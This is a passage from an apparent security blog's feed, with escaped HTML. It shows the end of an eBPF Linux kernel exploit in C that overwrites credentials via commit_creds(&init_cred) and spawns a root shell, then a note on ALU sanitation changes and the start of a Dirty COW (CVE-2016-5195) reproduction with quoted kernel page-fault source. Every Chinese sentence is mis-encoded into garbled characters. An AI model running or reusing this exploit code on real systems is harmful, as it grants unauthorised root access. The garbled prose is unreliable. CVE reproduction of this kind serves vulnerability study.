class="number">0x1000</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(values + <span class="number">0x8</span>) = commit_creds_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(values + <span class="number">0x10</span>) = init_creds_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(values + <span class="number">0x18</span>) = map_value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(modify_oob_map, <span class="keyword">sizeof</span>(modify_oob_map) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="number">1</span>, <span class="literal">NULL</span>))</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> key = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> next_key;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = map_fd2,</span><br><span class="line">        .key = &amp;key,</span><br><span class="line">        .next_key = &amp;next_key&#125;;</span><br><span class="line">    map_get_next_key(&amp;attr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] commit_cred(&amp;init_cred) done!\n&quot;</span>);</span><br><span class="line">    get_shell();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230812203539165.png"                      alt="image-20230812203539165"                ></p><h2 id="å€¼å¾—æ³¨æ„çš„"><a href="#å€¼å¾—æ³¨æ„çš„" class="headerlink" title="å€¼å¾—æ³¨æ„çš„"></a>å€¼å¾—æ³¨æ„çš„</h2><p>åœ¨linux kernel 5.11.16ç‰ˆæœ¬ä»¥åçš„ ALU sanitation æœºåˆ¶å‘ç”Ÿäº†æ”¹å˜ï¼Œä¸€æ˜¯<code>alu_limit</code>è®¡ç®—æ–¹æ³•å˜äº†ï¼Œä¸å†ç”¨æŒ‡é’ˆå¯„å­˜å™¨çš„ä½ç½®æ¥è®¡ç®—ï¼Œè€Œæ˜¯ä½¿ç”¨offsetå¯„å­˜å™¨ã€‚ä¾‹å¦‚ï¼Œå‡è®¾æœ‰ä¸ªå¯„å­˜å™¨çš„æ— ç¬¦å·è¾¹ç•Œæ˜¯ <code>umax_value = 1, umin_value = 0</code>ï¼Œåˆ™è®¡ç®—å‡º <code>alu_limit = 1</code>ï¼Œè¡¨ç¤ºå¦‚æœè¯¥å¯„å­˜å™¨åœ¨è¿è¡Œæ—¶è¶…å‡ºè¾¹ç•Œï¼Œåˆ™æŒ‡é’ˆè¿ç®—ä¸ä¼šä½¿ç”¨è¯¥å¯„å­˜å™¨ã€‚äºŒæ˜¯åœ¨runtimeæ—¶ä¼šç”¨ç«‹å³æ•°æ›¿æ¢æ‰ <code>verifier</code> è®¤å®šä¸ºå¸¸æ•°çš„å¯„å­˜å™¨ã€‚ä¾‹å¦‚ï¼Œ<code>BPF_ALU64_REG(BPF_ADD, BPF_REG_2, EXPLOIT_REG)</code> ï¼Œ<code>EXPLOIT_REG</code>è¢«verifierè®¤å®šä¸º0ï¼Œä½†è¿è¡Œæ—¶ä¸º1ï¼Œåˆ™å°†è¯¥æŒ‡ä»¤æ”¹ä¸º <code>BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0)</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> off_is_imm = tnum_is_const(off_reg-&gt;var_off);</span><br><span class="line">alu_state |= off_is_imm ? BPF_ALU_IMMEDIATE : <span class="number">0</span>;</span><br><span class="line">isimm = aux-&gt;alu_state &amp; BPF_ALU_IMMEDIATE;</span><br><span class="line"><span class="comment">// ... ...</span></span><br><span class="line"><span class="keyword">if</span> (isimm) &#123;</span><br><span class="line">        *patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux-&gt;alu_limit);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="comment">// Patch alu_limit check instructions</span></span><br><span class="line">         <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>å‚è€ƒé“¾æ¥:</p><p>â€‹    <a class="link"   href="https://elixir.bootlin.com/linux/v5.11.16/source" >https://elixir.bootlin.com/linux/v5.11.16/source<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://www.anquanke.com/post/id/251933#h2-1" >https://www.anquanke.com/post/id/251933#h2-1<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;æœ€è¿‘ä¸ºäº†æ‰¾å·¥ä½œç–¯ç‹‚å¤ç°CVEæ˜¯çœŸçš„å¤ªéš¾äº†ğŸ˜­ï¼Œä»Šå¤©æ‰å‘ç°æˆ‘å·¥ä½æ—è¾¹çš„å±…ç„¶æ˜¯fmyyçˆ·ğŸ˜­ï¼Œå±äºæ˜¯ç»™è·ªäº†ã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ¬¡å¤ç°çš„è¿™ä¸ªCVE</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    <category term="CVEå¤ç°" scheme="https://196082.github.io/categories/Linux-Kernel/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="ebpf" scheme="https://196082.github.io/tags/ebpf/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-5195å¤ç°</title>
    <link href="https://196082.github.io/2023/08/08/CVE-2016-5195/"/>
    <id>https://196082.github.io/2023/08/08/CVE-2016-5195/</id>
    <published>2023-08-08T02:46:43.000Z</published>
    <updated>2023-11-29T10:11:05.327Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>CVE-2016-5195å°±æ˜¯éå¸¸å‡ºåçš„<code>Dirty COW</code>ï¼Œä¿—ç§°<code>è„ç‰›æ¼æ´</code>ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡Linux Kernelä¸­çš„COW ( copy-on-write )æœºåˆ¶åˆ©ç”¨æ¡ä»¶ç«äº‰å®ç°è¶Šæƒå¯¹æ–‡ä»¶è¯»å†™ã€‚</p><p>æ­¤æ¼æ´è‡ªä»Linux Kernel 2.6.22ç‰ˆæœ¬å°±å­˜åœ¨ï¼Œç›´åˆ°2018å¹´Linux Kernel 4.8.3, 4.7.9, 4.4.26ç‰ˆæœ¬æ‰è¢«ä¿®å¤ã€‚å…¶å®è¿™ä¸€ä¸ªCVEåº”å½“æ˜¯ä¸€ä¸ªåˆå­¦è€…å¤ç°çš„ç¬¬ä¸€ä¸ªCVEçš„ï¼Œä½†æ˜¯å¯ç¬‘çš„æ˜¯æˆ‘æ˜¯çŸ¥é“ä»Šå¹´å››äº”æœˆä»½æ—¶é˜¿é‡Œå®ä¹ ç”ŸäºŒé¢çš„æ—¶å€™æ‰å¬è¯´è¿‡ï¼Œæ‰€ä»¥è¢«ç‹ ç‹ çš„åˆ·äº†ã€‚ç„¶è€Œä½œä¸ºä¸€æ¡æ‡’ç‹—æˆ‘ä¹Ÿæ˜¯ç¡¬æ‹–åˆ°ç°åœ¨æ‰è¿›è¡Œå¤ç°ï¼Œç„¶è€Œåœ¨ä¹‹å‰æˆ‘å°è¯•è¿‡å¤ç°ä¸€æ¬¡ä¸è¿‡å› ä¸ºç”µè„‘æ€§èƒ½è·‘ä¸å‡ºpocå°±æ”¾å¼ƒäº†ï¼Œå› ä¸ºæœ€è¿‘åˆè¦å¼€å§‹å„ç§é¢è¯•æ‰€ä»¥åˆè¦å¼€å§‹å­¦ä¹ å¾ˆå¤šä¸œè¥¿äº†ã€‚</p><h2 id="COWæœºåˆ¶"><a href="#COWæœºåˆ¶" class="headerlink" title="COWæœºåˆ¶"></a>COWæœºåˆ¶</h2><h3 id="basic-COW"><a href="#basic-COW" class="headerlink" title="basic COW"></a>basic COW</h3><p>COW å³ <code>copy on write</code>ï¼šç›®çš„æ˜¯ä¸ºäº†é™ä½ç³»ç»Ÿçš„å¼€é”€ï¼Œåœ¨ä¸€ä¸ªè¿›ç¨‹é€šè¿‡<code>fork()</code>åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹æ—¶ï¼Œå¹¶ä¸ä¼šç›´æ¥å°†çˆ¶è¿›ç¨‹çš„æ‰€æœ‰åœ°å€ç©ºé—´çš„æ‰€æœ‰å†…å®¹å¤åˆ¶å†åˆ†é…ç»™å­è¿›ç¨‹ã€‚è€Œå®é™…çš„æœºåˆ¶ä¸º<strong>çˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹å…±äº«æ‰€æœ‰çš„é¡µæ¡†ï¼Œè€Œä¸æ˜¯ç›´æ¥ç»™å­è¿›ç¨‹åˆ†é…æ–°çš„é¡µæ¡†ï¼Œåªæœ‰å½“å…¶ä¸­ä»»æ„ä¸€æ–¹å°è¯•å‘é¡µæ¡†å†™å…¥å†…å®¹æ—¶å†…æ ¸æ‰ä¼šä¸ºå…¶åˆ†é…é¡µæ¡†ï¼Œå¹¶å°†åŸæœ¬å†…æ¡†çš„å†…å®¹å¤åˆ¶è¿‡å»</strong>ã€‚</p><ol><li>  åœ¨<code>fork()</code>ç³»ç»Ÿè°ƒç”¨åï¼Œçˆ¶å­è¿›ç¨‹ä¼šå…±äº«æ‰€æœ‰çš„é¡µæ¡†ï¼Œå†…æ ¸å°†æ‰€æœ‰çš„é¡µæ¡†å®šä¹‰ä¸º<code>read-only</code>ã€‚</li><li>  ç”±äºæ‰€æœ‰é¡µæ¡†éƒ½æ˜¯åªè¯»çš„æƒé™ï¼Œå½“å…¶ä¸­ä»»æ„ä¸€æ–¹å°è¯•ä¿®æ”¹é¡µæ¡†æ—¶ä¾¿ä¼šè§¦å‘ç¼ºé¡µå¼‚å¸¸ï¼Œæ­¤æ—¶å†…æ ¸ä¼šä¸ºå…¶åˆ†é…æ–°çš„é¡µæ¡†ã€‚</li></ol><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230807101650345.png"                      alt="image-20230807101650345"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230807101734100.png"                      alt="image-20230807101734100"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230807101837765.png"                      alt="image-20230807101837765"                ></p><p>ä»¥ä¸Šå°±æ˜¯å†™æ—¶å¤åˆ¶çš„åŸºæœ¬æµç¨‹ï¼Œå¤§å¤§çš„å‡å°‘äº†ç³»ç»Ÿçš„å¼€é”€ã€‚</p><h3 id="mmap-ä¸-COW"><a href="#mmap-ä¸-COW" class="headerlink" title="mmap ä¸ COW"></a>mmap ä¸ COW</h3><p>åœ¨ä¸Šæ–‡ä¸­æƒ³å¿…å„ä½éƒ½çœ‹åˆ°äº†ä¸€ä¸ªéå¸¸ç†Ÿæ‚‰çš„è¯<code>ç¼ºé¡µå¼‚å¸¸</code>ï¼Œå…¶å®åœ¨åŸå…ˆçš„æ–‡ç« ä¸­æˆ‘ä»¬å·²ç»é‡åˆ°è¿‡äº†ç¼ºé¡µå¼‚å¸¸ä¹Ÿæ˜¯å¸¸ç”¨çš„<code>userfaultfd</code>æœºåˆ¶ã€‚ç„¶è€Œå½“æ—¶æˆ‘ä»¬åˆ›å»ºçš„æ˜¯<code>PROT_READ|PROT_WRITE</code>ï¼Œå½“æˆ‘ä»¬æ˜ å°„ä¸€ä¸ªåªæœ‰è¯»æƒé™çš„æ–‡ä»¶ï¼Œè‹¥æ˜¯æˆ‘ä»¬æ­¤æ—¶å‘æ˜ å°„ä¸­å†™å…¥å†…å®¹æ—¶åŒæ ·ä¼šè§¦å‘å†™æ—¶å¤åˆ¶çš„æœºåˆ¶ï¼Œå°†æ–‡ä»¶å†…å®¹æ‹·è´åˆ°å†…å­˜ä¸­ï¼Œæ­¤æ—¶è¿›ç¨‹å¯¹è¿™å—åŒºåŸŸçš„è¯»å†™ä¾¿ä¸ä¼šå½±å“ç£ç›˜ä¸­çš„æ–‡ä»¶äº†ã€‚</p><h2 id="ç¼ºé¡µå¼‚å¸¸-amp-write"><a href="#ç¼ºé¡µå¼‚å¸¸-amp-write" class="headerlink" title="ç¼ºé¡µå¼‚å¸¸&amp;write"></a>ç¼ºé¡µå¼‚å¸¸&amp;write</h2><p>åœ¨ä»¥å‰å†™è¿‡çš„<code>userfaultfd</code>è¿™ä¸€åˆ©ç”¨æ–¹æ³•çš„æ—¶å€™å¹¶æ²¡æœ‰åˆ†æè¿‡ç¼ºé¡µå¼‚å¸¸çš„åŸç†æ›´åˆ«ææºç åˆ†æäº†ï¼Œæ‰€ä»¥è¿™æ¬¡æ­£å¥½å†™ä¸€ä¸‹ã€‚</p><p>åœ¨CPUä¸­ä½¿ç”¨MMUè¿›è¡Œè™šæ‹Ÿå†…å­˜å’Œç‰©ç†å†…å­˜ä¹‹é—´çš„æ˜ å°„ï¼Œç„¶è€Œåœ¨ç³»ç»Ÿä¸­å¹¶ä¸æ˜¯æ‰€æœ‰çš„è™šæ‹Ÿå†…å­˜é¡µé¢éƒ½æœ‰å¯¹åº”çš„ç‰©ç†å†…å­˜é¡µï¼Œå½“è½¯ä»¶è¯•å›¾è®¿é—®å·²ç»è¢«æ˜ å°„åœ¨è™šæ‹Ÿå†…å­˜ä¸­ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è¢«åŠ è½½åˆ°ç‰©ç†å†…å­˜ä¸­çš„ä¸€ä¸ªåˆ†é¡µæ—¶ï¼ŒMMUæ— æ³•å®Œæˆç”±è™šæ‹Ÿå†…å­˜åˆ°ç‰©ç†å†…å­˜ä¹‹é—´çš„è½¬åŒ–ï¼Œæ­¤æ—¶ä¾¿ä¼šäº§ç”Ÿ<strong>ç¼ºé¡µå¼‚å¸¸</strong>ã€‚</p><h3 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h3><p>é‚£ä¹ˆè§¦å‘ç¼ºé¡µå¼‚å¸¸ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š</p><ol><li>  çº¿æ€§åœ°å€ä¸åœ¨è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­</li><li>  çº¿æ€§åœ°å€åœ¨è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ï¼Œä½†æ˜¯æƒé™ä¸å¤Ÿ</li><li>  çº¿æ€§åœ°å€åœ¨è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ï¼Œä½†æ˜¯æ²¡æœ‰ä¸ç‰©ç†åœ°å€ä¹‹é—´å»ºç«‹æ˜ å°„</li></ol><p>å…¶ç±»å‹ä¸»è¦åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§ï¼š</p><ol><li><p>è½¯æ€§ç¼ºé¡µå¼‚å¸¸</p><p>  è½¯æ€§ç¼ºé¡µå¼‚å¸¸æŒ‡çš„æ˜¯ç›¸å…³é¡µå·²ç»è¢«è½½å…¥åˆ°äº†å†…å­˜ä¸­ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰åœ¨MMUä¸­æ³¨å†Œï¼Œæ­¤æ—¶åªéœ€è¦å‘MMUæ³¨å†Œç›¸å…³çš„ç‰©ç†é¡µå³å¯ã€‚</p><p>  ä¸»è¦å‡ºç°åœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š</p><ol><li>  ä¸¤ä¸ªè¿›ç¨‹å…±äº«ç›¸åŒçš„ç‰©ç†é¡µæ¡†ï¼Œå†…æ ¸ä¸ºå…¶ä¸­ä¸€ä¸ªæ³¨å†Œäº†ç‰©ç†é¡µï¼Œä½†æ˜¯æ²¡æœ‰ä¸ºå¦å¤–ä¸€ä¸ªæ³¨å†Œ</li><li>  è¯¥é¡µå·²ç»è¢«CPUçš„å·¥ä½œé›†ä¸­ç§»é™¤ï¼Œä½†æ˜¯å°šæœªäº¤æ¢åˆ°ç£ç›˜ä¸Šï¼Œè‹¥æ˜¯ç¨‹åºé‡æ–°ä½¿ç”¨è¯¥é¡µåˆ™å¦éœ€å‘MMUæ³¨å†Œ</li></ol></li><li><p>ç¡¬æ€§ç¼ºé¡µå¼‚å¸¸</p><p>  ç¡¬æ€§ç¼ºé¡µå¼‚å¸¸åˆ™æ„å‘³ç€ä½¿ç”¨çš„é¡µå¹¶æ²¡æœ‰è¢«è½½å…¥åˆ°å†…å­˜ä¸­ï¼Œæ­¤æ—¶æ“ä½œç³»ç»Ÿåˆ™éœ€è¦è®²ä¸€ä¸ªåˆé€‚å¹¶ä¸”ç©ºé—²çš„ç‰©ç†é¡µè½½å…¥è¿›å†…å­˜ä¸­ï¼Œéšåå‘è¯¥é¡µä¸­å†™å…¥å†…å®¹ï¼Œå¹¶åœ¨MMUä¸­æ³¨å†Œã€‚ç¡¬æ€§ç¼ºé¡µå¼‚å¸¸çš„å¼€é”€æå¤§ï¼Œå› æ­¤éƒ¨åˆ†æ“ä½œç³»ç»Ÿä¹Ÿä¼šé‡‡å–å»¶è¿Ÿé¡µè½½å…¥çš„ç­–ç•¥â€”â€”åªæœ‰åˆ°ä¸‡ä¸å¾—å·²æ—¶æ‰ä¼šåˆ†é…æ–°çš„ç‰©ç†é¡µï¼Œè¿™ä¹Ÿæ˜¯ Linux å†…æ ¸çš„åšæ³•ã€‚è‹¥æ˜¯é¢‘ç¹åœ°å‘ç”Ÿç¡¬æ€§ç¼ºé¡µå¼‚å¸¸åˆ™ä¼šå¼•å‘ç³»ç»Ÿé¢ ç°¸ï¼Œå› èµ„æºè€—å°½è€Œæ— æ³•æ­£å¸¸å®Œæˆå·¥ä½œã€‚</p></li><li><p>æ— æ•ˆç¼ºé¡µå¼‚å¸¸</p><p>  æ„å‘³ç€è¿›ç¨‹è®¿é—®äº†ä¸€ä¸ªæ— æ•ˆçš„å†…å­˜åœ°å€ï¼Œæ­¤æ—¶kernelä¼šå‘è¿›ç¨‹å‘é€<code>SIGSEGV</code>ä¿¡å·ã€‚</p></li></ol><h3 id="å¤„ç†ç¼ºé¡µå¼‚å¸¸"><a href="#å¤„ç†ç¼ºé¡µå¼‚å¸¸" class="headerlink" title="å¤„ç†ç¼ºé¡µå¼‚å¸¸"></a>å¤„ç†ç¼ºé¡µå¼‚å¸¸</h3><p>é’ˆå¯¹æ–‡æœ¬çš„ç¼ºé¡µå¼‚å¸¸å¤„ç†çš„æµç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__do_page_fault() =&gt; __handle_mm_fault() =&gt; handle_pte_fault() =&gt; do_fault() =&gt; do_read_fault()/do_ww_fault()/do_shared_fault()</span><br></pre></td></tr></table></figure><p>ä»å¤´å¾€åçœ‹ï¼Œé¦–å…ˆçœ‹<code>__do_page_fault</code>å‡½æ•°ã€‚</p><h4 id="do-page-fault"><a href="#do-page-fault" class="headerlink" title="__do_page_fault"></a><strong>__do_page_fault</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> noinline <span class="keyword">void</span></span><br><span class="line">__do_page_fault(struct pt_regs *regs, <span class="keyword">unsigned</span> <span class="keyword">long</span> error_code,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line"><span class="keyword">int</span> fault, major = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;</span><br><span class="line"></span><br><span class="line">tsk = current;</span><br><span class="line">mm = tsk-&gt;mm;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Detect and handle instructions that would cause a page fault for</span></span><br><span class="line"><span class="comment"> * both a tracked kernel page and a userspace page.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (kmemcheck_active(regs))</span><br><span class="line">kmemcheck_hide(regs);</span><br><span class="line">prefetchw(&amp;mm-&gt;mmap_sem);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(kmmio_fault(regs, address)))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We fault-in kernel-space virtual memory on-demand. The</span></span><br><span class="line"><span class="comment"> * &#x27;reference&#x27; page table is init_mm.pgd.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * NOTE! We MUST NOT take any locks for this case. We may</span></span><br><span class="line"><span class="comment"> * be in an interrupt or a critical region, and should</span></span><br><span class="line"><span class="comment"> * only copy the information from the master page table,</span></span><br><span class="line"><span class="comment"> * nothing more.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This verifies that the fault happens in kernel space</span></span><br><span class="line"><span class="comment"> * (error_code &amp; 4) == 0, and that the fault was not a</span></span><br><span class="line"><span class="comment"> * protection error (error_code &amp; 9) == 0.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(fault_in_kernel_space(address))) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(error_code &amp; (PF_RSVD | PF_USER | PF_PROT))) &#123;</span><br><span class="line"><span class="keyword">if</span> (vmalloc_fault(address) &gt;= <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kmemcheck_fault(regs, address, error_code))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Can handle a stale RO-&gt;RW TLB: */</span></span><br><span class="line"><span class="keyword">if</span> (spurious_fault(error_code, address))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span></span><br><span class="line"><span class="keyword">if</span> (kprobes_fault(regs))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Don&#x27;t take the mm semaphore here. If we fixup a prefetch</span></span><br><span class="line"><span class="comment"> * fault we could otherwise deadlock:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* kprobes don&#x27;t want to hook the spurious faults: */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(kprobes_fault(regs)))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(error_code &amp; PF_RSVD))</span><br><span class="line">pgtable_bad(regs, error_code, address);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(smap_violation(error_code, regs))) &#123;</span><br><span class="line">bad_area_nosemaphore(regs, error_code, address);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we&#x27;re in an interrupt, have no user context or are running</span></span><br><span class="line"><span class="comment"> * in a region with pagefaults disabled then we must not take the fault</span></span><br><span 